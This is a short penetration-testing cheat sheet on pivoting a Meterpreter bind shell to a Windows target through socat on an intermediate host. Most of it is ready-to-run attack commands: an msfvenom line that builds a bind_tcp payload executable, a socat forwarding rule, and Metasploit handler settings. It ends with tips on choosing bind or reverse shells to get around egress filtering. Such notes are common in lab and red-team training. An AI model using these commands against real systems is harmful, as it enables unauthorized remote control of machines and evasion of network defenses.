# Socat Redirection — Bind Shell

Bind variant: Windows listens, your attack host connects inbound through socat on the pivot.

Generate bind payload on Windows — no LHOST needed, just the port Windows will listen on:

```bash
msfvenom -p windows/x64/meterpreter/bind_tcp -f exe -o <PAYLOAD>.exe LPORT=8443
```

Start socat on pivot — listens for your inbound connection and forwards to Windows:

```bash
socat TCP4-LISTEN:8080,fork TCP4:<WINDOWS_TARGET_IP>:8443
```

MSF bind handler — connect outbound to the pivot's socat port:

```
use exploit/multi/handler
set payload windows/x64/meterpreter/bind_tcp
set RHOST <PIVOT_IP>
set LPORT 8080
run
```

Flow: `MSF → pivot:8080 → socat → Windows:8443`

Session shows the pivot's IP as the connection endpoint — expected.

---

## Reverse vs Bind Socat — Quick Reference

Reverse: Windows initiates → pivot:PORT → socat → attack host. Use when Windows can reach the pivot but you can't reach Windows.

Bind: Attack host initiates → pivot:PORT → socat → Windows listener. Use when you can reach the pivot but can't get outbound connections from Windows.

> [!tip] Bind shells are useful when egress filtering on the Windows target blocks outbound connections but allows inbound. Pick based on what traffic the firewall permits, not personal preference.